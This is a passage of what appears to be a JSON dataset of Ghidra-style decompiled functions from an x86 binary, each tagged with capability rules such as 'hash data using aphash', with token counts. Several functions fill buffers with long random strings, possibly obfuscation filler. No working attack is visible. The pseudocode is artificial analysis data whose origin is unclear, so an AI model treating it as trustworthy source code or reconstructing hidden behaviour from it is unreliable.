*piStack40 = 0;\n        puVar5[4] = 0;\n        puVar5[5] = 0xf;\n        *puVar5 = 0;\n        uStack20 = 0x10;\n        *(puVar2 + -0x1a) = uStack36;\n        puVar2[-0x19] = \"solzlijdhivnipgiyr\";\n        puVar2[-0x1b] = 0x12;\n        puVar2[-0x1c] = 0x44876c;\n        fcn.00402f72();\n        puVar5 = piStack40;\n        piStack40[6] = *0x5429b0;\n        puVar5[7] = *0x5429b4;\n        puVar5[8] = *0x5429b8;\n        puVar5[9] = *0x5429bc;\n        puVar5[10] = 0x696;\n        puVar5[0xc] = 0x40ca1a00;\n        puVar5[0xb] = 0;\n        puVar2[-0x1c] = 0x448794;\n        uVar7 = fcn.00405b19();\n        puVar3 = puStack44;\n        piStack40 = puStack44;\n        *(puStack44 + -4) = uVar7;\n        *(puStack44 + -0x18) = 0;\n        *(puStack44 + -8) = 0;\n        *(puStack44 + -4) = 0xf;\n        puVar1 = puStack44 + -0x18;\n        puStack44 = puStack44 + -0x58;\n        *puVar1 = 0;\n        uStack20 = 0xb;\n        puVar3[-0x60] = uStack36;\n        *(puVar3 + -0x5c) = \"hnmwwzcmkdewphdbegqvfyloqgunuaoyyrjzrnqlckhhfeyzzgacqwgdfroxkffzakojqdhxhukgynhiy\";\n        *(puVar3 + -100) = 0x51;\n        *(puVar3 + -0x68) = 0x4487e6;\n        fcn.00402f72();\n        puVar2 = puStack44;\n        puStack44[0xe] = 0xf;\n        puVar2[0xd] = 0xd;\n        puVar2[9] = 0x6b6b736e;\n        puVar2[10] = 0x746b736a;\n        puVar2[0xb] = 0x6a7a6c79;\n        *(puVar2 + 0xc) = 0x67;\n        *puVar2 = *0x5429d0;\n        puVar2[1] = *0x5429d4;\n        puVar2[2] = *0x5429d8;\n        puVar2[3] = *0x5429dc;\n        puVar2[4] = *0x5429f0;\n        puVar2[5] = *0x5429f4;\n        puVar2[6] = *0x5429f8;\n        puVar2[7] = *0x5429fc;\n        *(puVar2 + 8) = 0;\n        *(puVar2 + 0xf) = 1;\n        *(puVar3 + -0x68) = 0x448834;\n        fcn.00401393();\n        puVar1 = piStack40;\n        *(piStack40 + -4) = 0x44883c;\n        fcn.00403dd7();\n        *(puVar1 + -0x10) = 0;\n        *(puVar1 + -0x14) = 0x448846;\n        fcn.0040611d();\n        *(puVar1 + -0x14) = 0;\n        *(puVar1 + -0x28) = 0;\n        *(puVar1 + -0x38) = 0x448860;\n        uVar7 = fcn.00402941();\n        puStack44 = puVar1 + -0x34;\n        *(puVar1 + -0x38) = uVar7;\n        piStack40 = puVar1 + -0x80;\n        *(puVar1 + -0x74) = 0;\n        *(puVar1 + -100) = 0;\n        *(puVar1 + -0x60) = 0xf;\n        puVar1[-0x74] = 0;\n        puVar1[-0x88] = uStack36;\n        *(puVar1 + -0x84) = \"tvimscmfyxvtokifganoxhqavqczrvdciurossqrahwyivxzzkbxdkovttpac\";\n        apuStack260[0] = 0x3d;\n        *(puVar1 + -0x90) = 0x4488a8;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        *piStack40 = 0x382;\n        piVar4[2] = 0x40ef0160;\n        piVar4[1] = 0;\n        *(piVar4 + 9) = 0;\n        piVar4[10] = *0x542a10;\n        piVar4[0xb] = *0x542a14;\n        piVar4[0xc] = *0x542a18;\n        piVar4[0xd] = *0x542a1c;\n        piVar4[0xe] = 0x1343;\n        *(piVar4 + 0xf) = 0;\n        piVar4[0x11] = 0x40edff80;\n        piVar4[0x10] = 0;\n        piVar4[0x12] = 0x19;\n        uVar6 = piVar4[8];\n        if (0xf < uVar6) {\n            iVar9 = piVar4[3];\n            uVar8 = uVar6 + 1;\n            iVar10 = iVar9;\n            if (0xfff < uVar8) {\n                iVar10 = *(iVar9 + -4);\n                if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x00449043;\n                uVar8 = uVar6 + 0x24;\n            }\n            *(puVar1 + -0x90) = uVar8;\n            *(puVar1 + -0x94) = iVar10;\n            *(puVar1 + -0x98) = 0x448923;\n            uVar6 = fcn.00401a32(*(puVar1 + -0x94));\n        }\n        puVar2 = puStack44;\n        puVar13 = puStack44 + -1;\n        puStack44[-1] = uVar6;\n        piStack40 = puVar2 + -0xb;\n        puVar2[-6] = 0;\n        puVar2[-2] = 0;\n        *puVar13 = 0xf;\n        *(puVar2 + -6) = 0;\n        *(puVar2 + -0xd) = uStack36;\n        puVar2[-0xc] = \"asllttglpxhoatewdjamjeprasnctgdzfe\";\n        puVar2[-0xe] = 0x22;\n        puVar2[-0xf] = 0x44896c;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        *piStack40 = &stack0xffffff40;\n        piVar4[1] = *0x542a30;\n        piVar4[2] = *0x542a34;\n        piVar4[3] = *0x542a38;\n        piVar4[4] = *0x542a3c;\n        puVar2[-0xf] = 0x448987;\n        fcn.00404ebc();\n        puVar2 = puStack44;\n        uVar6 = uStack172;\n        if (0xf < uStack172) {\n            uVar6 = uStack172 + 1;\n            uVar8 = uStack192;\n            if (0xfff < uVar6) {\n                uVar8 = *(uStack192 - 4);\n                if (0x1f < (uStack192 - 4) - uVar8) goto code_r0x0044904f;\n                uVar6 = uStack172 + 0x24;\n            }\n            puStack44[-1] = uVar6;\n            puVar2[-2] = uVar8;\n            puVar2[-3] = 0x4489c5;\n            uVar6 = fcn.00401a32(puVar2[-2]);\n        }\n        uStack176 = 0;\n        uStack172 = 0xf;\n        uStack192 = uStack192 & 0xffffff00;\n        puStack44 = puVar2;\n        puVar2[-1] = uVar6;\n        piStack40 = puVar2 + -0x21;\n        puStack48 = puVar2 + -10;\n        puVar2[-10] = 0;\n        puVar2[-6] = 0;\n        puVar2[-5] = 0xf;\n        *(puVar2 + -10) = 0;\n        *(puVar2 + -0x23) = uStack36;\n        puVar2[-0x22] = \"ayjpmpfjyjrhjikwifgqngfbzixsfbasgvynwxzpwjxoymyawahsxljwsrafezdtpimqisgkrb\";\n        puVar2[-0x24] = 0x4a;\n        puVar2[-0x25] = 0x448a2f;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        piStack56 = piStack40 + 0x11;\n        piStack40[0x11] = 0;\n        piVar4[0x15] = 0;\n        piVar4[0x16] = 0xf;\n        *(piVar4 + 0x11) = 0;\n        uStack20 = 0xd;\n        *(puVar2 + -0x26) = uStack36;\n        puVar2[-0x25] = \"bvtfbpmoftoepvfsrkmmvvdtsfkuryfrdobjhzdimybcdkmriup\";\n        puVar2[-0x27] = 0x33;\n        puVar2[-0x28] = 0x448a76;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        piStack52 = piStack40 + 9;\n        piStack40[9] = 0;\n        piVar4[0xd] = 0;\n        piVar4[0xe] = 0xf;\n        *(piVar4 + 9) = 0;\n        uStack20 = 0xe;\n        *(puVar2 + -0x29) = uStack36;\n        puVar2[-0x28] = \"rdshnzomcrlpvtuncfamsjlowaiwfatafpuy\";\n        puVar2[-0x2a] = 0x24;\n        puVar2[-0x2b] = 0x448abd;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        piStack40[3] = 0;\n        piVar4[7] = 0;\n        piVar4[8] = 0xf;\n        *(piVar4 + 3) = 0;\n        uStack20 = 0xf;\n        *(puVar2 + -0x2c) = uStack36;\n        puVar2[-0x2b] =\n             \"bjpvhmvsgabbhtgojvhgntyubbdksyieastejrycbmbnrulxapjswuwywrzfkgowxixtgqadnmummzcsdripciejtqjpmgomsyn\";\n        puVar2[-0x2d] = 99;\n        puVar2[-0x2e] = 0x448b03;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        piStack40[1] = 0x40c6e280;\n        *piVar4 = 0;\n        *(piVar4 + 2) = 0;\n        piVar4[0x10] = 0x40e22260;\n        piVar4[0xf] = 0;\n        piVar4[0x1d] = *0x542a50;\n        piVar4[0x1e] = *0x542a54;\n        piVar4[0x1f] = *0x542a58;\n        piVar4[0x20] = *0x542a5c;\n        puVar2[-0x2e] = 0x448b35;\n        fcn.004039d6();\n        puVar2 = puStack44;\n        uStack20 = 0xb;\n        apuStack260[0] = &stack0xffffff58;\n        puStack44[-2] = 0x448b4b;\n        fcn.00402a13();\n        if (0xf < uStack148) {\n            uVar6 = uStack148 + 1;\n            uVar8 = uStack168;\n            if (0xfff < uVar6) {\n                uVar8 = *(uStack168 - 4);\n                if (0x1f < (uStack168 - 4) - uVar8) goto code_r0x0044905b;\n                uVar6 = uStack148 + 0x24;\n            }\n            puVar2[-2] = uVar6;\n            puVar2[-3] = uVar8;\n            puVar2[-4] = 0x448b86;\n            fcn.00401a32(puVar2[-3]);\n        }\n        uStack152 = 0;\n        uStack148 = 0xf;\n        uStack168 = uStack168 & 0xffffff00;\n        apuStack260[0] = &stack0xffffff70;\n        puVar2[-2] = 0;\n        puVar2[-3] = 0;\n        puVar2[-4] = 0;\n        puVar2[-7] = 0;\n        puVar2[-9] = 0;\n        puVar2[-0xb] = 0x448bdd;\n        fcn.00403f80();\n        uVar6 = uStack124;\n        if (0xf < uStack124) {\n            uVar6 = uStack124 + 1;\n            uVar8 = uStack144;\n            if (0xfff < uVar6) {\n                uVar8 = *(uStack144 - 4);\n                if (0x1f < (uStack144 - 4) - uVar8) goto code_r0x00449067;\n                uVar6 = uStack124 + 0x24;\n            }\n            puVar2[-0xb] = uVar6;\n            puVar2[-0xc] = uVar8;\n            puVar2[-0xd] = 0x448c15;\n            uVar6 = fcn.00401a32(puVar2[-0xc]);\n        }\n        uStack128 = 0;\n        uStack124 = 0xf;\n        uStack144 = uStack144 & 0xffffff00;\n        puStack44 = &stack0xfffffefc;\n        puVar2[-0xb] = uVar6;\n        piStack40 = puVar2 + -0x11;\n        puVar2[-0x10] = 0;\n        puVar2[-0xc] = 0;\n        puVar2[-0xb] = 0xf;\n        *(puVar2 + -0x10) = 0;\n        *(puVar2 + -0x13) = uStack36;\n        puVar2[-0x12] = \"hfrmpqwzlqtmuryjewtuayzyaondfhxibtudcfbquwalvagckcdacrsleliyjxjxbih\";\n        apuStack260[0] = 0x43;\n        puVar2[-0x15] = 0x448c73;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        *piStack40 = &stack0xffffff88;\n        uStack100 = 0xf;\n        uStack104 = 8;\n        uStack116 = 0x77737477;\n        uStack120 = 0x65796763;\n        uStack112 = 0;\n        uVar6 = piVar4[6];\n        if (0xf < uVar6) {\n            iVar9 = piVar4[1];\n            uVar8 = uVar6 + 1;\n            iVar10 = iVar9;\n            if (0xfff < uVar8) {\n                iVar10 = *(iVar9 + -4);\n                if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x00449073;\n                uVar8 = uVar6 + 0x24;\n            }\n            puVar2[-0x15] = uVar8;\n            puVar2[-0x16] = iVar10;\n            puVar2[-0x17] = 0x448cd0;\n            fcn.00401a32(puVar2[-0x16]);\n        }\n        puVar2 = puStack44;\n        uVar6 = uStack100;\n        if (0xf < uStack100) {\n            uVar6 = uStack100 + 1;\n            uVar8 = uStack120;\n            if (0xfff < uVar6) {\n                uVar8 = *(uStack120 - 4);\n                if (0x1f < (uStack120 - 4) - uVar8) goto code_r0x0044907f;\n                uVar6 = uStack100 + 0x24;\n            }\n            puStack44[-1] = uVar6;\n            puVar2[-2] = uVar8;\n            puVar2[-3] = 0x448d0b;\n            uVar6 = fcn.00401a32(puVar2[-2]);\n        }\n        uStack104 = 0;\n        uStack100 = 0xf;\n        uStack120 = uStack120 & 0xffffff00;\n        puStack44 = puVar2;\n        puVar2[-1] = uVar6;\n        piStack40 = puVar2 + -0xc;\n        puVar2[-8] = 0;\n        puVar2[-4] = 0;\n        puVar2[-3] = 0xf;\n        *(puVar2 + -8) = 0;\n        *(puVar2 + -0xe) = uStack36;\n        puVar2[-0xd] = \"eacsxpzvnvhqdhwlvnltftxybj\";\n        apuStack260[0] = 0x1a;\n        puVar2[-0x10] = 0x448d66;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        piStack40[1] = 0x40ebcbc0;\n        *piVar4 = 0;\n        *(piVar4 + 2) = 1;\n        *(piVar4 + 3) = 0;\n        *(piVar4 + 10) = 0;\n        piVar4[0xb] = 7;\n        uVar6 = piVar4[9];\n        if (0xf < uVar6) {\n            iVar9 = piVar4[4];\n            uVar8 = uVar6 + 1;\n            iVar10 = iVar9;\n            if (0xfff < uVar8) {\n                iVar10 = *(iVar9 + -4);\n                if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x0044908b;\n                uVar8 = uVar6 + 0x24;\n            }\n            puVar2[-0x10] = uVar8;\n            puVar2[-0x11] = iVar10;\n            puVar2[-0x12] = 0x448dbe;\n            uVar6 = fcn.00401a32(puVar2[-0x11]);\n        }\n        puVar2 = puStack44;\n        puStack44[-1] = uVar6;\n        piStack40 = puVar2 + -0x18;\n        puVar2[-9] = 0;\n        puVar2[-5] = 0;\n        puVar2[-4] = 0xf;\n        *(puVar2 + -9) = 0;\n        *(puVar2 + -0x1a) = uStack36;\n        puVar2[-0x19] = \"iahwltjtzhpdilxohgqptgtkeyfxmaawh\";\n        puVar2[-0x1b] = 0x21;\n        puVar2[-0x1c] = 0x448e07;\n        fcn.00402f72();\n        puVar5 = piStack40;\n        piStack40[8] = 0xf;\n        puVar5[7] = 10;\n        puVar5[4] = 0x76776973;\n        *(puVar5 + 5) = 0x736f;\n        *(puVar5 + 0x16) = 0;\n        *puVar5 = *0x542a70;\n        puVar5[1] = *0x542a74;\n        puVar5[2] = *0x542a78;\n        puVar5[3] = str.yxvx._0_4_;\n        puVar5[9] = *0x542a90;\n        puVar5[10] = *0x542a94;\n        puVar5[0xb] = *0x542a98;\n        puVar5[0xc] = *0x542a9c;\n        puVar5[0xe] = 0x40ba7000;\n        puVar5[0xd] = 0;\n        puVar5[0x15] = 0x4ca;\n        puVar5[0x16] = 0x307;\n        puVar5[0x17] = 0x196b;\n        puVar2[-0x1c] = 0x448e66;\n        fcn.00403ee0();\n        puVar2 = puStack44;\n        puVar14 = puStack44 + -1;\n        puStack44[-1] = 0x30;\n        puVar2[-2] = 0x448e70;\n        uVar7 = fcn.004024b9(*puVar14, *puVar2);\n        puVar2[-1] = 0x30;\n        puVar2[-2] = uVar7;\n        puVar2[-3] = 0x448e7b;\n        fcn.00401a32(puVar2[-2]);\n        piStack40 = puVar2 + -9;\n        puStack44 = puVar2;\n        puVar2[-8] = 0;\n        puVar2[-4] = 0;\n        puVar2[-3] = 0xf;\n        *(puVar2 + -8) = 0;\n        *(puVar2 + -0xb) = uStack36;\n        puVar2[-10] = \"vowzfonovutiwzzttmywuy\";\n        apuStack260[0] = 0x16;\n        puVar2[-0xd] = 0x448ec3;\n        fcn.00402f72();\n        piVar4 = piStack40;\n        *piStack40 = &stack0xffffffa0;\n        *(piVar4 + 7) = 0;\n        *(piVar4 + 8) = 1;\n        uStack76 = 0xf;\n        uStack80 = 9;\n        uStack96 = 0x62746679;\n        uStack92 = 0x61706877;\n        uStack88 = 0x69;\n        uVar6 = piVar4[6];\n        if (0xf < uVar6) {\n            iVar9 = piVar4[1];\n            uVar8 = uVar6 + 1;\n            iVar10 = iVar9;\n            if (0xfff < uVar8) {\n                iVar10 = *(iVar9 + -4);\n                if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x00449097;\n                uVar8 = uVar6 + 0x24;\n            }\n            puVar2[-0xd] = uVar8;\n            puVar2[-0xe] = iVar10;\n            puVar2[-0xf] = 0x448f2a;\n            fcn.00401a32(puVar2[-0xe]);\n        }\n        puVar2 = puStack44;\n        uVar6 = uStack76;\n        if (0xf < uStack76) {\n            uVar6 = uStack76 + 1;\n            uVar8 = uStack96;\n            if (0xfff < uVar6) {\n                uVar8 = *(uStack96 - 4);\n                if (0x1f < (uStack96 - 4) - uVar8) goto code_r0x004490a3;\n                uVar6 = uStack76 + 0x24;\n            }\n            puStack44[-1] = uVar6;\n            puVar2[-2] = uVar8;\n            puVar2[-3] = 0x448f65;\n            uVar6 = fcn.00401a32(puVar2[-2]);\n        }\n        uStack80 = 0;\n        uStack76 = 0xf;\n        uStack96 = uStack96 & 0xffffff00;\n        puVar2[-1] = uVar6;\n        piStack40 = puVar2 + -0x14;\n        puStack44 = puVar2 + -0xe;\n        puVar2[-9] = 0xf;\n        puVar2[-10] = 8;\n        *(puVar2 + -0xc) = 0;\n        puVar2[-0x14] = 0;\n        puVar2[-0x10] = *0x542ab0;\n        puVar2[-0xf] = *0x542ab4;\n        puVar2[-0xe] = str.htimaiay._0_4_;\n        puVar2[-0xd] = str.htimaiay._4_4_;\n        *(puVar2 + -0x14) = 0;\n        uStack20 = 0xc;\n        *(puVar2 + -0x16) = uStack36;\n        puVar2[-0x15] = \"xlgohkvvvxdpidkukbnxsbaw\";\n        puVar2[-0x17] = 0x18;\n        puVar2[-0x18] = 0x448fd4;\n        fcn.00402f72();\n        puVar1 = piStack40;\n        *(piStack40 + 0x30) = 1;\n        *(puVar1 + 0x34) = 0x641;\n        *(puVar1 + 0x3c) = 0x40dfa680;\n        *(puVar1 + 0x38) = 0;\n        puVar1[0x40] = 0;\n        *(puVar1 + 0x48) = 0x40e910c0;\n        *(puVar1 + 0x44) = 0;\n        *(puVar1 + 0x4c) = 0x14c3;\n        uStack20 = 0xb;\n        puVar2[-0x18] = 0x449015;\n        fcn.0040179e();\n        *in_FS_OFFSET = iStack28;\n        return iStack72;\n    }\n    iVar9 = piVar4[2];\n    iVar10 = iVar9;\n    if ((uVar6 + 1 < 0x1000) || (iVar10 = *(iVar9 + -4),  (iVar9 + -4) - iVar10 < 0x20)) {\n        uVar6 = fcn.00401a32(iVar10);\n        goto code_r0x00448452;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00449037:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00449043:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0044904f:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0044905b:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00449067:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00449073:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0044907f:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0044908b:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x00449097:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x004490a3:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar9 = fcn.00403a76();\n    return iVar9;\n}\n",
        "token_count": 9696
    },
    "0041a010": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.0041a010(uint param_1, uint param_2, ulong param_3, int32_t param_4, uint param_5, uint64_t param_6)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint uVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint ****ppppuVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t **in_FS_OFFSET;\n    uchar uStack68;\n    uchar uStack67;\n    ushort uStack66;\n    uchar auStack64 [4];\n    int32_t iStack60;\n    uint ****appppuStack56 [4];\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff8c;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e420;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack40 = 0;\n    uStack36 = 0xf;\n    appppuStack56[0] = NULL;\n    uVar2 = *(param_4 + 0x14) & 0x3000;\n    if (uVar2 == 0x3000) {\n        uVar10 = 0xffffffff;\n        uVar9 = 0xd;\n    }\n    else {\n        uVar10 = *(param_4 + 0x18);\n        uVar8 = *(param_4 + 0x1c);\n        uVar9 = uVar10;\n        if ((SBORROW4(uVar8, uVar10 == 0) != false) != uVar8 - (uVar10 == 0) < 0) {\n            if ((uVar8 | uVar10) == 0) {\n                uVar10 = 0;\n                uVar9 = uVar2 == 0;\n            }\n            else {\n                uVar9 = 6;\n            }\n        }\n    }\n    puVar1 = &stack0xffffff8c;\n    if ((uVar2 == 0x2000) && (puVar1 = &stack0xffffff8c,  *0x4ea4f8 < (*0x4ea4e0 & param_6))) {\n        fcn.00405c77(param_6, param_6 >> 0x20, &iStack60);\n        iVar6 = -iStack60;\n        if (0 < iStack60) {\n            iVar6 = iStack60;\n        }\n        uVar9 = uVar9 + (iVar6 * 0x7597 >> 5) / 0xc35;\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    uVar2 = uVar9 + 0x32;\n    if (uVar2 == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n        appppuStack56[0]._0_1_ = 0;\n        uStack40 = uVar2;\n    }\n    else if (uVar2 < 0x10) {\n        uStack40 = uVar2;\n        fcn.0040314d();\n        (&stack0xfffffffa)[uVar9] = 0;\n    }\n    else {\n        uStack20 = 1;\n        fcn.00401ec9();\n    }\n    uVar2 = *(param_4 + 0x14);\n    uStack68 = 0x25;\n    if ((uVar2 & 0x20) == 0) {\n        puVar3 = &uStack67;\n    }\n    else {\n        puVar3 = &uStack66;\n        uStack67 = 0x2b;\n    }\n    if ((uVar2 & 0x10) != 0) {\n        *puVar3 = 0x23;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0x2a2e;\n    *(puVar3 + 1) = 0x4c;\n    uVar8 = uVar2 & 0x3000;\n    if ((uVar2 & 4) == 0) {\n        if (uVar8 == 0x1000) {\n            uVar5 = 0x65;\n            goto code_r0x0041a21e;\n        }\n        if (uVar8 != 0x2000) {\n            if (uVar8 == 0x3000) {\n                uVar5 = 0x61;\n            }\n            else {\n                uVar5 = 0x67;\n            }\n            goto code_r0x0041a21e;\n        }\n    }\n    else {\n        if (uVar8 == 0x1000) {\n            uVar5 = 0x45;\n            goto code_r0x0041a21e;\n        }\n        if (uVar8 != 0x2000) {\n            if (uVar8 == 0x3000) {\n                uVar5 = 0x41;\n            }\n            else {\n                uVar5 = 0x47;\n            }\n            goto code_r0x0041a21e;\n        }\n    }\n    uVar5 = 0x66;\ncode_r0x0041a21e:\n    *(puVar3 + 3) = uVar5;\n    *(puVar3 + 2) = 0;\n    ppppuVar7 = appppuStack56[0];\n    if (uStack36 < 0x10) {\n        ppppuVar7 = appppuStack56;\n    }\n    uStack20 = 1;\n    fcn.004054ed(ppppuVar7, uStack40, &uStack68, uVar10);\n    fcn.004037dd(param_1, param_2, param_3);\n    if (0xf < uStack36) {\n        ppppuVar7 = appppuStack56[0];\n        if ((0xfff < uStack36 + 1) && (ppppuVar7 = appppuStack56[0][-1],  0x1f < appppuStack56[0] + (-4 - ppppuVar7))) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            uVar4 = fcn.00403a76();\n            return uVar4;\n        }\n        fcn.00401a32(ppppuVar7);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_2;\n}\n",
        "token_count": 1515
    },
    "00401ece": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ece(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    int32_t arg_10h_00;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = ((*(arg_18h + 4) == '\\0') - 1 & 0x1d) + 0x17;\n    if (arg_ch < 0x41) {\n        if (*arg_8h == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar6 = arg_8h[1];\n        }\n        if (*arg_8h < 2) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = arg_8h[2];\n        }\n        var_ch = arg_14h ^ 1;\n        iVar3 = CONCAT44(uVar5, uVar6);\n    }\n    else {\n        uVar8 = arg_ch >> 5;\n        arg_ch = arg_ch & 0x1f;\n        iVar7 = uVar8 - 2;\n        uVar5 = iVar7 * 0x20;\n        uVar6 = arg_8h[uVar8 - 1];\n        puVar1 = arg_8h + uVar8;\n        if (arg_ch == 0) {\n            arg_10h_00 = uVar5 + arg_10h_00;\n            puVar2 = arg_8h + (uVar8 - 1);\n            uVar4 = arg_14h ^ 1;\n            var_ch = (uVar5 & 0xffffff00 | arg_14h) ^ 1;\n            iVar3 = CONCAT44(*puVar1, *puVar2);\n            if (iVar7 != 0) {\n                do {\n                    arg_8h = arg_8h + 1;\n                    uVar4 = uVar4 & (*arg_8h != 0) - 1U;\n                    iVar7 = iVar7 + -1;\n                } while (iVar7 != 0);\n                var_ch = uVar5 & 0xffffff00 | uVar4;\n                iVar3 = CONCAT44(*puVar1, *puVar2);\n            }\n        }\n        else {\n            uVar4 = 1;\n            arg_10h_00 = uVar5 + arg_ch + arg_10h_00;\n            iVar9 = fcn.004040a7();\n            iVar10 = fcn.004040a7();\n            iVar11 = fcn.00401b90();\n            if ((arg_14h != 0) || (((1 << arg_ch) - 1U & uVar6) != 0)) {\n                uVar4 = 0;\n            }\n            var_ch = uVar5 & 0xffffff00 | uVar4;\n            for (; iVar3 = iVar9 + iVar10 + iVar11,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                arg_8h = arg_8h + 1;\n                uVar4 = uVar4 & (*arg_8h != 0) - 1U;\n                var_ch = var_ch & 0xffffff00 | uVar4;\n            }\n        }\n    }\n    fcn.004067da(iVar3, iVar3 >> 0x20, arg_10h_00, arg_10h, var_ch, arg_18h);\n    return;\n}\n",
        "token_count": 904
    },
    "00402973": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402973(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "004039ea": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_b2ch\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004039ea(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t uVar13;\n    uint32_t *puVar14;\n    uint *puVar15;\n    bool bVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    int32_t iVar19;\n    uint32_t *var_b2ch;\n    uint var_b28h;\n    uint32_t *var_95ch;\n    uint32_t *var_958h;\n    uint32_t *var_954h;\n    int32_t var_950h;\n    uint32_t *var_94ch;\n    uint32_t *var_948h;\n    uint32_t var_944h;\n    uint32_t *var_940h;\n    uint32_t *var_93ch;\n    uint32_t *var_938h;\n    uint32_t *var_934h;\n    uint32_t *var_930h;\n    uint32_t *var_92ch;\n    uint32_t *var_928h;\n    uint32_t *var_924h;\n    uint32_t *var_920h;\n    uint32_t *var_91ch;\n    uint32_t *var_918h;\n    uint32_t *var_914h;\n    uint32_t var_910h;\n    uint32_t *var_744h;\n    uint32_t var_740h;\n    uint var_73ch;\n    uint32_t *var_574h;\n    uint var_570h;\n    uint32_t *var_3a4h;\n    uint32_t var_3a0h;\n    uint32_t *var_1d4h;\n    uint32_t var_1d0h;\n    uint var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar10 = *arg_8h;\n    var_948h = arg_8h;\n    var_950h = arg_ch;\n    var_94ch = ((*(arg_ch + 4) == '\\0') - 1 & 0x1d) + 0x19;\n    if (uVar10 < 0) {\n        uVar10 = 0;\n    }\n    uVar13 = arg_8h[1];\n    uVar3 = uVar10;\n    if (uVar13 <= uVar10) {\n        uVar3 = uVar13;\n    }\n    var_938h = uVar10 - uVar3;\n    puVar14 = arg_8h + 2;\n    var_954h = uVar3 + 8 + arg_8h;\n    var_958h = uVar13 + 8 + arg_8h;\n    puVar11 = NULL;\n    var_91ch = var_958h - var_954h;\n    var_918h = NULL;\n    uVar10 = 0;\n    var_1d4h = NULL;\n    var_920h = NULL;\n    var_93ch = puVar14;\n    if (puVar14 != var_954h) {\n        do {\n            if (uVar10 == 9) {\n                var_93ch = puVar14;\n                if (puVar11 != NULL) {\n                    uVar10 = 0;\n                    puVar12 = NULL;\n                    do {\n                        uVar13 = (&var_1d0h)[puVar12];\n                        uVar3 = uVar13 * 1000000000;\n                        (&var_1d0h)[puVar12] = uVar3 + uVar10;\n                        uVar10 = (uVar13 * 1000000000 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar12 = puVar12 + 1;\n                    } while 